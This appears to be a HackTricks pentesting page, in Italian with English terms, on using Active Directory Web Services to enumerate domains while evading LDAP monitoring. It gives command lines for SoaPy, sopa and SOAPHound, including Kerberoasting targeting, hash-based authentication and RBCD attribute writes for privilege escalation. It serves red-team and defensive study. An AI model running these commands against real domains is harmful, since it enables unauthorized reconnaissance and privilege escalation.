# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) è **enabled by default on every Domain Controller since Windows Server 2008 R2** e ascolta sulla porta TCP **9389**. Nonostante il nome, **no HTTP is involved**. Invece, il servizio espone dati in stile LDAP tramite uno stack di protocolli di framing .NET proprietari:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Poiché il traffico è incapsulato all'interno di questi frame SOAP binari e transita su una porta poco comune, **enumeration through ADWS is far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic**. Per gli operatori questo significa:

* Stealthier recon – i Blue team spesso si concentrano sulle query LDAP.
* Libertà di raccogliere da **non-Windows hosts (Linux, macOS)** tramite tunnelling di 9389/TCP attraverso un proxy SOCKS.
* Gli stessi dati ottenibili via LDAP (users, groups, ACLs, schema, ecc.) e la possibilità di effettuare **writes** (es. `msDs-AllowedToActOnBehalfOfOtherIdentity` per **RBCD**).

Le interazioni ADWS sono implementate su WS-Enumeration: ogni query inizia con un messaggio `Enumerate` che definisce il filtro/attributi LDAP e restituisce un `EnumerationContext` GUID, seguito da uno o più messaggi `Pull` che trasferiscono fino alla finestra di risultati definita dal server. I context scadono dopo ~30 minutes, quindi gli strumenti devono o fare paging dei risultati o suddividere i filtri (query con prefisso per CN) per evitare di perdere lo stato. Quando si richiedono security descriptors, specificare il controllo `LDAP_SERVER_SD_FLAGS_OID` per omettere le SACLs, altrimenti ADWS semplicemente omette l'attributo `nTSecurityDescriptor` dalla sua risposta SOAP.

> NOTA: ADWS è anche usato da molti strumenti RSAT GUI/PowerShell, quindi il traffico può confondersi con attività amministrative legittime.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) è una **full re-implementation of the ADWS protocol stack in pure Python**. Compone i frame NBFX/NBFSE/NNS/NMF byte-per-byte, permettendo la raccolta da sistemi Unix-like senza utilizzare il runtime .NET.

### Key Features

* Supports **proxying through SOCKS** (utile da C2 implants).
* Filtri di ricerca fine identici a LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** per ingestione diretta in BloodHound.
* Flag `--parse` per rendere più leggibili timestamps / `userAccountControl` quando è richiesta la leggibilità umana.

### Targeted collection flags & write operations

SoaPy include switch curati che replicano i compiti di hunting LDAP più comuni su ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oltre a raw `--query` / `--filter` per pull personalizzati. Abbinali a primitive di scrittura come `--rbcd <source>` (imposta `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging per targeted Kerberoasting) e `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Esempio di targeted SPN hunt che restituisce solo `samAccountName` e `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Usa lo stesso host/credenziali per sfruttare immediatamente i risultati: dump RBCD-capable objects with `--rbcds`, poi applica `--rbcd 'WEBSRV01$' --account 'FILE01$'` per configurare una Resource-Based Constrained Delegation chain (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) per il percorso di abuso completo).

### Installazione (host operatore)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork di `ldapdomaindump` che sostituisce le query LDAP con chiamate ADWS su TCP/9389 per ridurre gli hit di LDAP-signature.
* Esegue un controllo iniziale di raggiungibilità su 9389 a meno che non venga passato `--force` (salta la probe se le scansioni di porte sono rumorose/filtrate).
* Testato contro Microsoft Defender for Endpoint e CrowdStrike Falcon con bypass riuscito nel README.

### Installazione
```bash
pipx install .
```
### Uso
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
L'output tipico registra il controllo di raggiungibilità 9389, il bind ADWS e l'inizio/fine del dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

Analogamente a soapy, [sopa](https://github.com/Macmod/sopa) implementa lo stack del protocollo ADWS (MS-NNS + MC-NMF + SOAP) in Golang, esponendo flag da riga di comando per inviare chiamate ADWS come:

* **Ricerca e recupero di oggetti** - `query` / `get`
* **Ciclo di vita degli oggetti** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Modifica degli attributi** - `attr [add|replace|delete]`
* **Gestione degli account** - `set-password` / `change-password`
* e altri come `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ecc.

### Protocol mapping highlights

* Le ricerche in stile LDAP vengono eseguite tramite **WS-Enumeration** (`Enumerate` + `Pull`) con proiezione degli attributi, controllo dell'ambito (Base/OneLevel/Subtree) e paginazione.
* Il recupero di un singolo oggetto utilizza **WS-Transfer** `Get`; le modifiche agli attributi utilizzano `Put`; le eliminazioni utilizzano `Delete`.
* La creazione di oggetti integrata utilizza **WS-Transfer ResourceFactory**; oggetti personalizzati usano una **IMDA AddRequest** guidata da template YAML.
* Le operazioni sulle password sono azioni **MS-ADCAP** (`SetPassword`, `ChangePassword`).

### Unauthenticated metadata discovery (mex)

ADWS espone WS-MetadataExchange senza credenziali, che è un modo rapido per verificare l'esposizione prima di autenticarsi:
```bash
sopa mex --dc <DC>
```
### Scoperta DNS/DC e note sul targeting Kerberos

Sopa può risolvere i DCs tramite SRV se `--dc` è omesso e `--domain` è fornito. Interroga in questo ordine e usa il target con priorità più alta:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operativamente, preferire un resolver controllato dal DC per evitare errori in ambienti segmentati:

* Usa `--dns <DC-IP>` così **tutte** le ricerche SRV, PTR e forward passano attraverso il DNS del DC.
* Usa `--dns-tcp` quando UDP è bloccato o le risposte SRV sono grandi.
* Se Kerberos è abilitato e `--dc` è un IP, sopa effettua un **PTR inverso** per ottenere un FQDN per il corretto targeting SPN/KDC. Se Kerberos non viene usato, non avviene alcuna ricerca PTR.

Esempio (IP + Kerberos, DNS forzato tramite il DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opzioni per il materiale di autenticazione

Oltre alle password in chiaro, sopa supporta **NT hashes**, **Kerberos AES keys**, **ccache** e **PKINIT certificates** (PFX o PEM) per l'autenticazione ADWS. Kerberos è implicito quando si usa `--aes-key`, `-c` (ccache) o opzioni basate su certificati.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Creazione di oggetti personalizzati tramite template

Per classi di oggetti arbitrarie, il comando `create custom` consuma un template YAML che mappa a una IMDA `AddRequest`:

* `parentDN` e `rdn` definiscono il container e il DN relativo.
* `attributes[].name` supporta `cn` o `addata:cn` con namespace.
* `attributes[].type` accetta `string|int|bool|base64|hex` o espliciti `xsd:*`.
* Non includere `ad:relativeDistinguishedName` o `ad:container-hierarchy-parent`; sopa li inietta.
* i valori `hex` vengono convertiti in `xsd:base64Binary`; usa `value: ""` per impostare stringhe vuote.

## SOAPHound – Raccolta ADWS ad alto volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) è un collector .NET che mantiene tutte le interazioni LDAP all'interno di ADWS e emette JSON compatibile con BloodHound v4. Costruisce una cache completa di `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` una sola volta (`--buildcache`), poi la riutilizza per passate ad alto volume `--bhdump`, `--certdump` (ADCS) o `--dnsdump` (AD-integrated DNS), in modo che solo ~35 attributi critici lascino mai il DC. AutoSplit (`--autosplit --threshold <N>`) suddivide automaticamente le query per prefisso CN per rimanere al di sotto del timeout di EnumerationContext di 30 minuti in grandi foreste.

Flusso di lavoro tipico su una VM operatore connessa al dominio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
I file JSON esportati vengono inseriti direttamente nei workflow di SharpHound/BloodHound — vedi [BloodHound methodology](bloodhound.md) per idee sulla visualizzazione grafica a valle. AutoSplit rende SOAPHound resiliente su foreste con milioni di oggetti, mantenendo il numero di query inferiore rispetto agli snapshot in stile ADExplorer.

## Stealth AD Collection Workflow

Il seguente workflow mostra come enumerare **oggetti di dominio & ADCS** tramite ADWS, convertirli in BloodHound JSON e cercare percorsi di attacco basati su certificati – tutto da Linux:

1. **Tunnel 9389/TCP** dalla rete target alla tua macchina (es. via Chisel, Meterpreter, SSH dynamic port-forward, ecc.).  Esporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` o usa i parametri di SoaPy `--proxyHost/--proxyPort`.

2. **Raccogli l'oggetto radice del dominio:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Raccogli oggetti correlati ad ADCS dalla Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converti in BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Carica il file ZIP** nella GUI di BloodHound ed esegui query cypher come `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` per rivelare percorsi di escalation dei certificati (ESC1, ESC8, ecc.).

### Scrittura di `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combina questo con `s4u2proxy`/`Rubeus /getticket` per una catena completa di **Resource-Based Constrained Delegation** (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Riepilogo strumenti

| Scopo | Strumento | Note |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Riferimenti

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
